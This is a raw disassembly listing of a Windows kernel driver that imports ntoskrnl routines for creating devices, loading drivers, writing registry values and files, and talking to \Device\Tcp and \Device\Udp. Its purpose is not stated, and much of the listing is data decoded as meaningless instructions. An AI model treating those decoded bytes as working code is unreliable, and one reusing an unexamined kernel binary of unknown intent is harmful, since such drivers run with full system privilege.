   14af8:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   14afe:	5c                   	pop    %rsp
   14aff:	00 54 00 63          	add    %dl,0x63(%rax,%rax,1)
   14b03:	00 70 00             	add    %dh,0x0(%rax)
   14b06:	00 00                	add    %al,(%rax)
   14b08:	cc                   	int3
   14b09:	cc                   	int3
   14b0a:	cc                   	int3
   14b0b:	cc                   	int3
   14b0c:	cc                   	int3
   14b0d:	cc                   	int3
   14b0e:	cc                   	int3
   14b0f:	cc                   	int3
   14b10:	5c                   	pop    %rsp
   14b11:	00 44 00 65          	add    %al,0x65(%rax,%rax,1)
   14b15:	00 76 00             	add    %dh,0x0(%rsi)
   14b18:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   14b1e:	5c                   	pop    %rsp
   14b1f:	00 55 00             	add    %dl,0x0(%rbp)
   14b22:	64 00 70 00          	add    %dh,%fs:0x0(%rax)
   14b26:	00 00                	add    %al,(%rax)
   14b28:	cc                   	int3
   14b29:	cc                   	int3
   14b2a:	cc                   	int3
   14b2b:	cc                   	int3
   14b2c:	cc                   	int3
   14b2d:	cc                   	int3
   14b2e:	cc                   	int3
   14b2f:	cc                   	int3
   14b30:	25 75 2e 25 75       	and    $0x75252e75,%eax
   14b35:	2e 25 75 2e 25 75    	cs and $0x75252e75,%eax
   14b3b:	00 cc                	add    %cl,%ah
   14b3d:	cc                   	int3
   14b3e:	cc                   	int3
   14b3f:	cc                   	int3
   14b40:	54                   	push   %rsp
   14b41:	72 61                	jb     0x14ba4
   14b43:	6e                   	outsb  (%rsi),(%dx)
   14b44:	73 70                	jae    0x14bb6
   14b46:	6f                   	outsl  (%rsi),(%dx)
   14b47:	72 74                	jb     0x14bbd
   14b49:	41                   	rex.B
   14b4a:	64 64 72 65          	fs fs jb 0x14bb3
   14b4e:	73 73                	jae    0x14bc3
   14b50:	00 cc                	add    %cl,%ah
   14b52:	cc                   	int3
   14b53:	cc                   	int3
   14b54:	cc                   	int3
   14b55:	cc                   	int3
   14b56:	cc                   	int3
   14b57:	cc                   	int3
   14b58:	cc                   	int3
   14b59:	cc                   	int3
   14b5a:	cc                   	int3
   14b5b:	cc                   	int3
   14b5c:	cc                   	int3
   14b5d:	cc                   	int3
   14b5e:	cc                   	int3
   14b5f:	cc                   	int3
   14b60:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14b62:	6e                   	outsb  (%rsi),(%dx)
   14b63:	6e                   	outsb  (%rsi),(%dx)
   14b64:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   14b69:	6e                   	outsb  (%rsi),(%dx)
   14b6a:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14b6c:	6e                   	outsb  (%rsi),(%dx)
   14b6d:	74 65                	je     0x14bd4
   14b6f:	78 74                	js     0x14be5
	...

Disassembly of section INIT:

0000000000019000 <INIT>:
	...
   19008:	48 8b 05 f1 d0 ff ff 	mov    -0x2f0f(%rip),%rax        # 0x16100
   1900f:	48 ba 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rdx
   19016:	2b 00 00 
   19019:	48 85 c0             	test   %rax,%rax
   1901c:	74 05                	je     0x19023
   1901e:	48 3b c2             	cmp    %rdx,%rax
   19021:	75 2f                	jne    0x19052
   19023:	48 8d 0d d6 d0 ff ff 	lea    -0x2f2a(%rip),%rcx        # 0x16100
   1902a:	48 b8 20 03 00 00 80 	movabs $0xfffff78000000320,%rax
   19031:	f7 ff ff 
   19034:	48 8b 00             	mov    (%rax),%rax
   19037:	48 33 c1             	xor    %rcx,%rax
   1903a:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   19041:	ff 00 00 
   19044:	48 23 c1             	and    %rcx,%rax
   19047:	48 0f 44 c2          	cmove  %rdx,%rax
   1904b:	48 89 05 ae d0 ff ff 	mov    %rax,-0x2f52(%rip)        # 0x16100
   19052:	48 f7 d0             	not    %rax
   19055:	48 89 05 ac d0 ff ff 	mov    %rax,-0x2f54(%rip)        # 0x16108
   1905c:	c3                   	ret
   1905d:	cc                   	int3
   1905e:	cc                   	int3
   1905f:	cc                   	int3
   19060:	cc                   	int3
   19061:	cc                   	int3
   19062:	cc                   	int3
   19063:	cc                   	int3
   19064:	48 83 ec 28          	sub    $0x28,%rsp
   19068:	4c 8b c2             	mov    %rdx,%r8
   1906b:	4c 8b c9             	mov    %rcx,%r9
   1906e:	e8 95 ff ff ff       	call   0x19008
   19073:	49 8b d0             	mov    %r8,%rdx
   19076:	49 8b c9             	mov    %r9,%rcx
   19079:	48 83 c4 28          	add    $0x28,%rsp
   1907d:	e9 ea 7f ff ff       	jmp    0x1106c
   19082:	cc                   	int3
   19083:	cc                   	int3
   19084:	b0 90                	mov    $0x90,%al
	...
   1908e:	00 00                	add    %al,(%rax)
   19090:	50                   	push   %rax
   19091:	95                   	xchg   %eax,%ebp
   19092:	00 00                	add    %al,(%rax)
   19094:	00 50 00             	add    %dl,0x0(%rax)
	...
   190af:	00 30                	add    %dh,(%rax)
   190b1:	92                   	xchg   %eax,%edx
   190b2:	00 00                	add    %al,(%rax)
   190b4:	00 00                	add    %al,(%rax)
   190b6:	00 00                	add    %al,(%rax)
   190b8:	48 92                	xchg   %rax,%rdx
   190ba:	00 00                	add    %al,(%rax)
   190bc:	00 00                	add    %al,(%rax)
   190be:	00 00                	add    %al,(%rax)
   190c0:	60                   	(bad)
   190c1:	92                   	xchg   %eax,%edx
   190c2:	00 00                	add    %al,(%rax)
   190c4:	00 00                	add    %al,(%rax)
   190c6:	00 00                	add    %al,(%rax)
   190c8:	72 92                	jb     0x1905c
   190ca:	00 00                	add    %al,(%rax)
   190cc:	00 00                	add    %al,(%rax)
   190ce:	00 00                	add    %al,(%rax)
   190d0:	7e 92                	jle    0x19064
   190d2:	00 00                	add    %al,(%rax)
   190d4:	00 00                	add    %al,(%rax)
   190d6:	00 00                	add    %al,(%rax)
   190d8:	96                   	xchg   %eax,%esi
   190d9:	92                   	xchg   %eax,%edx
   190da:	00 00                	add    %al,(%rax)
   190dc:	00 00                	add    %al,(%rax)
   190de:	00 00                	add    %al,(%rax)
   190e0:	a8 92                	test   $0x92,%al
   190e2:	00 00                	add    %al,(%rax)
   190e4:	00 00                	add    %al,(%rax)
   190e6:	00 00                	add    %al,(%rax)
   190e8:	b2 92                	mov    $0x92,%dl
   190ea:	00 00                	add    %al,(%rax)
   190ec:	00 00                	add    %al,(%rax)
   190ee:	00 00                	add    %al,(%rax)
   190f0:	c8 92 00 00          	enter  $0x92,$0x0
   190f4:	00 00                	add    %al,(%rax)
   190f6:	00 00                	add    %al,(%rax)
   190f8:	e0 92                	loopne 0x1908c
   190fa:	00 00                	add    %al,(%rax)
   190fc:	00 00                	add    %al,(%rax)
   190fe:	00 00                	add    %al,(%rax)
   19100:	f2 92                	repnz xchg %eax,%edx
   19102:	00 00                	add    %al,(%rax)
   19104:	00 00                	add    %al,(%rax)
   19106:	00 00                	add    %al,(%rax)
   19108:	fc                   	cld
   19109:	92                   	xchg   %eax,%edx
   1910a:	00 00                	add    %al,(%rax)
   1910c:	00 00                	add    %al,(%rax)
   1910e:	00 00                	add    %al,(%rax)
   19110:	08 93 00 00 00 00    	or     %dl,0x0(%rbx)
   19116:	00 00                	add    %al,(%rax)
   19118:	1c 93                	sbb    $0x93,%al
   1911a:	00 00                	add    %al,(%rax)
   1911c:	00 00                	add    %al,(%rax)
   1911e:	00 00                	add    %al,(%rax)
   19120:	26 93                	es xchg %eax,%ebx
   19122:	00 00                	add    %al,(%rax)
   19124:	00 00                	add    %al,(%rax)
   19126:	00 00                	add    %al,(%rax)
   19128:	42 93                	rex.X xchg %eax,%ebx
   1912a:	00 00                	add    %al,(%rax)
   1912c:	00 00                	add    %al,(%rax)
   1912e:	00 00                	add    %al,(%rax)
   19130:	4e 93                	rex.WRX xchg %rax,%rbx
   19132:	00 00                	add    %al,(%rax)
   19134:	00 00                	add    %al,(%rax)
   19136:	00 00                	add    %al,(%rax)
   19138:	68 93 00 00 00       	push   $0x93
   1913d:	00 00                	add    %al,(%rax)
   1913f:	00 78 93             	add    %bh,-0x6d(%rax)
   19142:	00 00                	add    %al,(%rax)
   19144:	00 00                	add    %al,(%rax)
   19146:	00 00                	add    %al,(%rax)
   19148:	86 93 00 00 00 00    	xchg   %dl,0x0(%rbx)
   1914e:	00 00                	add    %al,(%rax)
   19150:	94                   	xchg   %eax,%esp
   19151:	93                   	xchg   %eax,%ebx
   19152:	00 00                	add    %al,(%rax)
   19154:	00 00                	add    %al,(%rax)
   19156:	00 00                	add    %al,(%rax)
   19158:	a0 93 00 00 00 00 00 	movabs 0xb600000000000093,%al
   1915f:	00 b6 
   19161:	93                   	xchg   %eax,%ebx
   19162:	00 00                	add    %al,(%rax)
   19164:	00 00                	add    %al,(%rax)
   19166:	00 00                	add    %al,(%rax)
   19168:	ce                   	(bad)
   19169:	93                   	xchg   %eax,%ebx
   1916a:	00 00                	add    %al,(%rax)
   1916c:	00 00                	add    %al,(%rax)
   1916e:	00 00                	add    %al,(%rax)
   19170:	e8 93 00 00 00       	call   0x19208
   19175:	00 00                	add    %al,(%rax)
   19177:	00 f8                	add    %bh,%al
   19179:	93                   	xchg   %eax,%ebx
   1917a:	00 00                	add    %al,(%rax)
   1917c:	00 00                	add    %al,(%rax)
   1917e:	00 00                	add    %al,(%rax)
   19180:	06                   	(bad)
   19181:	94                   	xchg   %eax,%esp
   19182:	00 00                	add    %al,(%rax)
   19184:	00 00                	add    %al,(%rax)
   19186:	00 00                	add    %al,(%rax)
   19188:	12 94 00 00 00 00 00 	adc    0x0(%rax,%rax,1),%dl
   1918f:	00 20                	add    %ah,(%rax)
   19191:	94                   	xchg   %eax,%esp
   19192:	00 00                	add    %al,(%rax)
   19194:	00 00                	add    %al,(%rax)
   19196:	00 00                	add    %al,(%rax)
   19198:	2e 94                	cs xchg %eax,%esp
   1919a:	00 00                	add    %al,(%rax)
   1919c:	00 00                	add    %al,(%rax)
   1919e:	00 00                	add    %al,(%rax)
   191a0:	36 94                	ss xchg %eax,%esp
   191a2:	00 00                	add    %al,(%rax)
   191a4:	00 00                	add    %al,(%rax)
   191a6:	00 00                	add    %al,(%rax)
   191a8:	4e 94                	rex.WRX xchg %rax,%rsp
   191aa:	00 00                	add    %al,(%rax)
   191ac:	00 00                	add    %al,(%rax)
   191ae:	00 00                	add    %al,(%rax)
   191b0:	58                   	pop    %rax
   191b1:	94                   	xchg   %eax,%esp
   191b2:	00 00                	add    %al,(%rax)
   191b4:	00 00                	add    %al,(%rax)
   191b6:	00 00                	add    %al,(%rax)
   191b8:	68 94 00 00 00       	push   $0x94
   191bd:	00 00                	add    %al,(%rax)
   191bf:	00 72 94             	add    %dh,-0x6c(%rdx)
   191c2:	00 00                	add    %al,(%rax)
   191c4:	00 00                	add    %al,(%rax)
   191c6:	00 00                	add    %al,(%rax)
   191c8:	80 94 00 00 00 00 00 	adcb   $0x0,0x0(%rax,%rax,1)
   191cf:	00 
   191d0:	94                   	xchg   %eax,%esp
   191d1:	94                   	xchg   %eax,%esp
   191d2:	00 00                	add    %al,(%rax)
   191d4:	00 00                	add    %al,(%rax)
   191d6:	00 00                	add    %al,(%rax)
   191d8:	9e                   	sahf
   191d9:	94                   	xchg   %eax,%esp
   191da:	00 00                	add    %al,(%rax)
   191dc:	00 00                	add    %al,(%rax)
   191de:	00 00                	add    %al,(%rax)
   191e0:	a8 94                	test   $0x94,%al
   191e2:	00 00                	add    %al,(%rax)
   191e4:	00 00                	add    %al,(%rax)
   191e6:	00 00                	add    %al,(%rax)
   191e8:	b4 94                	mov    $0x94,%ah
   191ea:	00 00                	add    %al,(%rax)
   191ec:	00 00                	add    %al,(%rax)
   191ee:	00 00                	add    %al,(%rax)
   191f0:	d4                   	(bad)
   191f1:	94                   	xchg   %eax,%esp
   191f2:	00 00                	add    %al,(%rax)
   191f4:	00 00                	add    %al,(%rax)
   191f6:	00 00                	add    %al,(%rax)
   191f8:	f0 94                	lock xchg %eax,%esp
   191fa:	00 00                	add    %al,(%rax)
   191fc:	00 00                	add    %al,(%rax)
   191fe:	00 00                	add    %al,(%rax)
   19200:	0c 95                	or     $0x95,%al
   19202:	00 00                	add    %al,(%rax)
   19204:	00 00                	add    %al,(%rax)
   19206:	00 00                	add    %al,(%rax)
   19208:	24 95                	and    $0x95,%al
   1920a:	00 00                	add    %al,(%rax)
   1920c:	00 00                	add    %al,(%rax)
   1920e:	00 00                	add    %al,(%rax)
   19210:	30 95 00 00 00 00    	xor    %dl,0x0(%rbp)
   19216:	00 00                	add    %al,(%rax)
   19218:	40 95                	rex xchg %eax,%ebp
   1921a:	00 00                	add    %al,(%rax)
   1921c:	00 00                	add    %al,(%rax)
   1921e:	00 00                	add    %al,(%rax)
   19220:	5e                   	pop    %rsi
   19221:	95                   	xchg   %eax,%ebp
	...
   1922e:	00 00                	add    %al,(%rax)
   19230:	e5 01                	in     $0x1,%eax
   19232:	49 6f                	rex.WB outsl (%rsi),(%dx)
   19234:	44                   	rex.R
   19235:	65 6c                	gs insb (%dx),(%rdi)
   19237:	65 74 65             	gs je  0x1929f
   1923a:	53                   	push   %rbx
   1923b:	79 6d                	jns    0x192aa
   1923d:	62 6f 6c 69 63       	(bad)
   19242:	4c 69 6e 6b 00 00 ba 	imul   $0x5ba0000,0x6b(%rsi),%r13
   19249:	05 
   1924a:	52                   	push   %rdx
   1924b:	74 6c                	je     0x192b9
   1924d:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1924f:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%rbp,%rdx,2),%esi
   19256:	64 
   19257:	65 53                	gs push %rbx
   19259:	74 72                	je     0x192cd
   1925b:	69 6e 67 00 00 e3 01 	imul   $0x1e30000,0x67(%rsi),%ebp
   19262:	49 6f                	rex.WB outsl (%rsi),(%dx)
   19264:	44                   	rex.R
   19265:	65 6c                	gs insb (%dx),(%rdi)
   19267:	65 74 65             	gs je  0x192cf
   1926a:	44                   	rex.R
   1926b:	65 76 69             	gs jbe 0x192d7
   1926e:	63 65 00             	movsxd 0x0(%rbp),%esp
   19271:	00 1f                	add    %bl,(%rdi)
   19273:	08 73 77             	or     %dh,0x77(%rbx)
   19276:	70 72                	jo     0x192ea
   19278:	69 6e 74 66 00 00 bd 	imul   $0xbd000066,0x74(%rsi),%ebp
   1927f:	04 50                	add    $0x50,%al
   19281:	73 43                	jae    0x192c6
   19283:	72 65                	jb     0x192ea
   19285:	61                   	(bad)
   19286:	74 65                	je     0x192ed
   19288:	53                   	push   %rbx
   19289:	79 73                	jns    0x192fe
   1928b:	74 65                	je     0x192f2
   1928d:	6d                   	insl   (%dx),(%rdi)
   1928e:	54                   	push   %rsp
   1928f:	68 72 65 61 64       	push   $0x64616572
   19294:	00 00                	add    %al,(%rax)
   19296:	70 00                	jo     0x19298
   19298:	45 78 41             	rex.RB js 0x192dc
   1929b:	6c                   	insb   (%dx),(%rdi)
   1929c:	6c                   	insb   (%dx),(%rdi)
   1929d:	6f                   	outsl  (%rsi),(%dx)
   1929e:	63 61 74             	movsxd 0x74(%rcx),%esp
   192a1:	65 50                	gs push %rax
   192a3:	6f                   	outsl  (%rsi),(%dx)
   192a4:	6f                   	outsl  (%rsi),(%dx)
   192a5:	6c                   	insb   (%dx),(%rdi)
   192a6:	00 00                	add    %al,(%rax)
   192a8:	12 07                	adc    (%rdi),%al
   192aa:	5a                   	pop    %rdx
   192ab:	77 43                	ja     0x192f0
   192ad:	6c                   	insb   (%dx),(%rdi)
   192ae:	6f                   	outsl  (%rsi),(%dx)
   192af:	73 65                	jae    0x19316
   192b1:	00 a3 02 49 6f 66    	add    %ah,0x666f4902(%rbx)
   192b7:	43 6f                	rex.XB outsl (%rsi),(%dx)
   192b9:	6d                   	insl   (%dx),(%rdi)
   192ba:	70 6c                	jo     0x19328
   192bc:	65 74 65             	gs je  0x19324
   192bf:	52                   	push   %rdx
   192c0:	65 71 75             	gs jno 0x19338
   192c3:	65 73 74             	gs jae 0x1933a
   192c6:	00 00                	add    %al,(%rax)
   192c8:	d8 01                	fadds  (%rcx)
   192ca:	49 6f                	rex.WB outsl (%rsi),(%dx)
   192cc:	43 72 65             	rex.XB jb 0x19334
   192cf:	61                   	(bad)
   192d0:	74 65                	je     0x19337
   192d2:	53                   	push   %rbx
   192d3:	79 6d                	jns    0x19342
   192d5:	62 6f 6c 69 63       	(bad)
   192da:	4c 69 6e 6b 00 00 ce 	imul   $0x1ce0000,0x6b(%rsi),%r13
   192e1:	01 
   192e2:	49 6f                	rex.WB outsl (%rsi),(%dx)
   192e4:	43 72 65             	rex.XB jb 0x1934c
   192e7:	61                   	(bad)
   192e8:	74 65                	je     0x1934f
   192ea:	44                   	rex.R
   192eb:	65 76 69             	gs jbe 0x19357
   192ee:	63 65 00             	movsxd 0x0(%rbp),%esp
   192f1:	00 0a                	add    %cl,(%rdx)
   192f3:	08 73 70             	or     %dh,0x70(%rbx)
   192f6:	72 69                	jb     0x19361
   192f8:	6e                   	outsb  (%rsi),(%dx)
   192f9:	74 66                	je     0x19361
   192fb:	00 d6                	add    %dl,%dh
   192fd:	07                   	(bad)
   192fe:	5f                   	pop    %rdi
   192ff:	73 74                	jae    0x19375
   19301:	72 6e                	jb     0x19371
   19303:	69 63 6d 70 00 8b 00 	imul   $0x8b0070,0x6d(%rbx),%esp
   1930a:	45 78 46             	rex.RB js 0x19353
   1930d:	72 65                	jb     0x19374
   1930f:	65 50                	gs push %rax
   19311:	6f                   	outsl  (%rsi),(%dx)
   19312:	6f                   	outsl  (%rsi),(%dx)
   19313:	6c                   	insb   (%dx),(%rdi)
   19314:	57                   	push   %rdi
   19315:	69 74 68 54 61 67 00 	imul   $0x1d006761,0x54(%rax,%rbp,2),%esi
   1931c:	1d 
   1931d:	08 73 74             	or     %dh,0x74(%rbx)
   19320:	72 73                	jb     0x19395
   19322:	74 72                	je     0x19396
   19324:	00 00                	add    %al,(%rax)
   19326:	bf 03 4d 6d 47       	mov    $0x476d4d03,%edi
   1932b:	65 74 53             	gs je  0x19381
   1932e:	79 73                	jns    0x193a3
   19330:	74 65                	je     0x19397
   19332:	6d                   	insl   (%dx),(%rdi)
   19333:	52                   	push   %rdx
   19334:	6f                   	outsl  (%rsi),(%dx)
   19335:	75 74                	jne    0x193ab
   19337:	69 6e 65 41 64 64 72 	imul   $0x72646441,0x65(%rsi),%ebp
   1933e:	65 73 73             	gs jae 0x193b4
   19341:	00 f8                	add    %bh,%al
   19343:	01 49 6f             	add    %ecx,0x6f(%rcx)
   19346:	46 72 65             	rex.RX jb 0x193ae
   19349:	65 4d                	gs rex.WRB
   1934b:	64 6c                	fs insb (%dx),(%rdi)
   1934d:	00 d2                	add    %dl,%dl
   1934f:	02 4b 65             	add    0x65(%rbx),%cl
   19352:	44                   	rex.R
   19353:	65 6c                	gs insb (%dx),(%rdi)
   19355:	61                   	(bad)
   19356:	79 45                	jns    0x1939d
   19358:	78 65                	js     0x193bf
   1935a:	63 75 74             	movsxd 0x74(%rbp),%esi
   1935d:	69 6f 6e 54 68 72 65 	imul   $0x65726854,0x6e(%rdi),%ebp
   19364:	61                   	(bad)
   19365:	64 00 00             	add    %al,%fs:(%rax)
   19368:	1b 07                	sbb    (%rdi),%eax
   1936a:	5a                   	pop    %rdx
   1936b:	77 43                	ja     0x193b0
   1936d:	72 65                	jb     0x193d4
   1936f:	61                   	(bad)
   19370:	74 65                	je     0x193d7
   19372:	46 69 6c 65 00 00 e5 	imul   $0x5f07e500,0x0(%rbp,%r12,2),%r13d
   19379:	07 5f 
   1937b:	76 73                	jbe    0x193f0
   1937d:	6e                   	outsb  (%rsi),(%dx)
   1937e:	77 70                	ja     0x193f0
   19380:	72 69                	jb     0x193eb
   19382:	6e                   	outsb  (%rsi),(%dx)
   19383:	74 66                	je     0x193eb
   19385:	00 e3                	add    %ah,%bl
   19387:	07                   	(bad)
   19388:	5f                   	pop    %rdi
   19389:	76 73                	jbe    0x193fe
   1938b:	6e                   	outsb  (%rsi),(%dx)
   1938c:	70 72                	jo     0x19400
   1938e:	69 6e 74 66 00 00 17 	imul   $0x17000066,0x74(%rsi),%ebp
   19395:	06                   	(bad)
   19396:	52                   	push   %rdx
   19397:	74 6c                	je     0x19405
   19399:	52                   	push   %rdx
   1939a:	61                   	(bad)
   1939b:	6e                   	outsb  (%rsi),(%dx)
   1939c:	64 6f                	outsl  %fs:(%rsi),(%dx)
   1939e:	6d                   	insl   (%dx),(%rdi)
   1939f:	00 dc                	add    %bl,%ah
   193a1:	03 4d 6d             	add    0x6d(%rbp),%ecx
   193a4:	50                   	push   %rax
   193a5:	72 6f                	jb     0x19416
   193a7:	62 65 41 6e 64       	(bad)
   193ac:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   193ae:	63 6b 50             	movsxd 0x50(%rbx),%ebp
   193b1:	61                   	(bad)
   193b2:	67 65 73 00          	addr32 gs jae 0x193b6
   193b6:	88 04 4f             	mov    %al,(%rdi,%rcx,2)
   193b9:	62 66 44 65 72       	(bad)
   193be:	65 66 65 72 65       	gs data16 gs jb 0x19428
   193c3:	6e                   	outsb  (%rsi),(%dx)
   193c4:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   193c7:	62 6a 65 63 74       	(bad)
   193cc:	00 00                	add    %al,(%rax)
   193ce:	71 07                	jno    0x193d7
   193d0:	5a                   	pop    %rdx
   193d1:	77 51                	ja     0x19424
   193d3:	75 65                	jne    0x1943a
   193d5:	72 79                	jb     0x19450
   193d7:	49 6e                	rex.WB outsb (%rsi),(%dx)
   193d9:	66 6f                	outsw  (%rsi),(%dx)
   193db:	72 6d                	jb     0x1944a
   193dd:	61                   	(bad)
   193de:	74 69                	je     0x19449
   193e0:	6f                   	outsl  (%rsi),(%dx)
   193e1:	6e                   	outsb  (%rsi),(%dx)
   193e2:	46 69 6c 65 00 00 ae 	imul   $0x4901ae00,0x0(%rbp,%r12,2),%r13d
   193e9:	01 49 
   193eb:	6f                   	outsl  (%rsi),(%dx)
   193ec:	41 6c                	rex.B insb (%dx),(%rdi)
   193ee:	6c                   	insb   (%dx),(%rdi)
   193ef:	6f                   	outsl  (%rsi),(%dx)
   193f0:	63 61 74             	movsxd 0x74(%rcx),%esp
   193f3:	65 4d                	gs rex.WRB
   193f5:	64 6c                	fs insb (%dx),(%rdi)
   193f7:	00 20                	add    %ah,(%rax)
   193f9:	08 73 77             	or     %dh,0x77(%rbx)
   193fc:	70 72                	jo     0x19470
   193fe:	69 6e 74 66 5f 73 00 	imul   $0x735f66,0x74(%rsi),%ebp
   19405:	00 13                	add    %dl,(%rbx)
   19407:	08 73 74             	or     %dh,0x74(%rbx)
   1940a:	72 63                	jb     0x1946f
   1940c:	70 79                	jo     0x19487
   1940e:	5f                   	pop    %rdi
   1940f:	73 00                	jae    0x19411
   19411:	00 bb 07 5a 77 57    	add    %bh,0x57775a07(%rbx)
   19417:	72 69                	jb     0x19482
   19419:	74 65                	je     0x19480
   1941b:	46 69 6c 65 00 1e 07 	imul   $0x775a071e,0x0(%rbp,%r12,2),%r13d
   19422:	5a 77 
   19424:	43 72 65             	rex.XB jb 0x1948c
   19427:	61                   	(bad)
   19428:	74 65                	je     0x1948f
   1942a:	4b                   	rex.WXB
   1942b:	65 79 00             	gs jns 0x1942e
   1942e:	f4                   	hlt
   1942f:	07                   	(bad)
   19430:	61                   	(bad)
   19431:	74 6f                	je     0x194a2
   19433:	69 00 00 6b 06 52    	imul   $0x52066b00,(%rax),%eax
   19439:	74 6c                	je     0x194a7
   1943b:	57                   	push   %rdi
   1943c:	72 69                	jb     0x194a7
   1943e:	74 65                	je     0x194a5
   19440:	52                   	push   %rdx
   19441:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%ebx),%esi
   19448:	56 61 
   1944a:	6c                   	insb   (%dx),(%rdi)
   1944b:	75 65                	jne    0x194b2
   1944d:	00 1b                	add    %bl,(%rbx)
   1944f:	08 73 74             	or     %dh,0x74(%rbx)
   19452:	72 72                	jb     0x194c6
   19454:	63 68 72             	movsxd 0x72(%rax),%ebp
   19457:	00 3e                	add    %bh,(%rsi)
   19459:	07                   	(bad)
   1945a:	5a                   	pop    %rdx
   1945b:	77 4c                	ja     0x194a9
   1945d:	6f                   	outsl  (%rsi),(%dx)
   1945e:	61                   	(bad)
   1945f:	64 44 72 69          	fs rex.R jb 0x194cc
   19463:	76 65                	jbe    0x194ca
   19465:	72 00                	jb     0x19467
   19467:	00 fa                	add    %bh,%dl
   19469:	07                   	(bad)
   1946a:	69 73 73 70 61 63 65 	imul   $0x65636170,0x73(%rbx),%esi
   19471:	00 65 03             	add    %ah,0x3(%rbp)
   19474:	4b                   	rex.WXB
   19475:	65 53                	gs push %rbx
   19477:	65 74 45             	gs je  0x194bf
   1947a:	76 65                	jbe    0x194e1
   1947c:	6e                   	outsb  (%rsi),(%dx)
   1947d:	74 00                	je     0x1947f
   1947f:	00 f7                	add    %dh,%bh
   19481:	02 4b 65             	add    0x65(%rbx),%cl
   19484:	49 6e                	rex.WB outsb (%rsi),(%dx)
   19486:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   1948d:	65 
   1948e:	45 76 65             	rex.RB jbe 0x194f6
   19491:	6e                   	outsb  (%rsi),(%dx)
   19492:	74 00                	je     0x19494
   19494:	f7 07 69 73 64 69    	testl  $0x69647369,(%rdi)
   1949a:	67 69 74 00 f8 07 69 	imul   $0x6c736907,-0x8(%eax,%eax,1),%esi
   194a1:	73 6c 
   194a3:	6f                   	outsl  (%rsi),(%dx)
   194a4:	77 65                	ja     0x1950b
   194a6:	72 00                	jb     0x194a8
   194a8:	fc                   	cld
   194a9:	07                   	(bad)
   194aa:	69 73 78 64 69 67 69 	imul   $0x69676964,0x78(%rbx),%esi
   194b1:	74 00                	je     0x194b3
   194b3:	00 b9 01 49 6f 42    	add    %bh,0x426f4901(%rcx)
   194b9:	75 69                	jne    0x19524
   194bb:	6c                   	insb   (%dx),(%rdi)
   194bc:	64 44                	fs rex.R
   194be:	65 76 69             	gs jbe 0x1952a
   194c1:	63 65 49             	movsxd 0x49(%rbp),%esp
   194c4:	6f                   	outsl  (%rsi),(%dx)
   194c5:	43 6f                	rex.XB outsl (%rsi),(%dx)
   194c7:	6e                   	outsb  (%rsi),(%dx)
   194c8:	74 72                	je     0x1953c
   194ca:	6f                   	outsl  (%rsi),(%dx)
   194cb:	6c                   	insb   (%dx),(%rdi)
   194cc:	52                   	push   %rdx
   194cd:	65 71 75             	gs jno 0x19545
   194d0:	65 73 74             	gs jae 0x19547
   194d3:	00 17                	add    %dl,(%rdi)
   194d5:	02 49 6f             	add    0x6f(%rcx),%cl
   194d8:	47                   	rex.RXB
   194d9:	65 74 52             	gs je  0x1952e
   194dc:	65 6c                	gs insb (%dx),(%rdi)
   194de:	61                   	(bad)
   194df:	74 65                	je     0x19546
   194e1:	64 44                	fs rex.R
   194e3:	65 76 69             	gs jbe 0x1954f
   194e6:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   194e9:	62 6a 65 63 74       	(bad)
   194ee:	00 00                	add    %al,(%rax)
   194f0:	7c 04                	jl     0x194f6
   194f2:	4f 62 52 65 66 65    	(bad)
   194f8:	72 65                	jb     0x1955f
   194fa:	6e                   	outsb  (%rsi),(%dx)
   194fb:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   194fe:	62 6a 65 63 74       	(bad)
   19503:	42 79 48             	rex.X jns 0x1954e
   19506:	61                   	(bad)
   19507:	6e                   	outsb  (%rsi),(%dx)
   19508:	64 6c                	fs insb (%dx),(%rdi)
   1950a:	65 00 87 03 4b 65 57 	add    %al,%gs:0x57654b03(%rdi)
   19511:	61                   	(bad)
   19512:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%rsi,%rax,2),%esi
   19519:	6e 
   1951a:	67 6c                	insb   (%dx),(%edi)
   1951c:	65 4f 62 6a 65 63 74 	(bad)
   19523:	00 f7                	add    %dh,%bh
   19525:	01 49 6f             	add    %ecx,0x6f(%rcx)
   19528:	46 72 65             	rex.RX jb 0x19590
   1952b:	65 49 72 70          	gs rex.WB jb 0x1959f
   1952f:	00 a2 02 49 6f 66    	add    %ah,0x666f4902(%rdx)
   19535:	43 61                	rex.XB (bad)
   19537:	6c                   	insb   (%dx),(%rdi)
   19538:	6c                   	insb   (%dx),(%rdi)
   19539:	44 72 69             	rex.R jb 0x195a5
   1953c:	76 65                	jbe    0x195a3
   1953e:	72 00                	jb     0x19540
   19540:	c8 02 4b 65          	enter  $0x4b02,$0x65
   19544:	42 75 67             	rex.X jne 0x195ae
   19547:	43 68 65 63 6b 45    	rex.XB push $0x456b6365
   1954d:	78 00                	js     0x1954f
   1954f:	00 6e 74             	add    %ch,0x74(%rsi)
   19552:	6f                   	outsl  (%rsi),(%dx)
   19553:	73 6b                	jae    0x195c0
   19555:	72 6e                	jb     0x195c5
   19557:	6c                   	insb   (%dx),(%rdi)
   19558:	2e 65 78 65          	cs js,pn 0x195c1
   1955c:	00 00                	add    %al,(%rax)
   1955e:	bd 07 5f 5f 43       	mov    $0x435f5f07,%ebp
   19563:	5f                   	pop    %rdi
   19564:	73 70                	jae    0x195d6
   19566:	65 63 69 66          	movsxd %gs:0x66(%rcx),%ebp
   1956a:	69 63 5f 68 61 6e 64 	imul   $0x646e6168,0x5f(%rbx),%esp
   19571:	6c                   	insb   (%dx),(%rdi)
   19572:	65 72 00             	gs jb  0x19575
	...
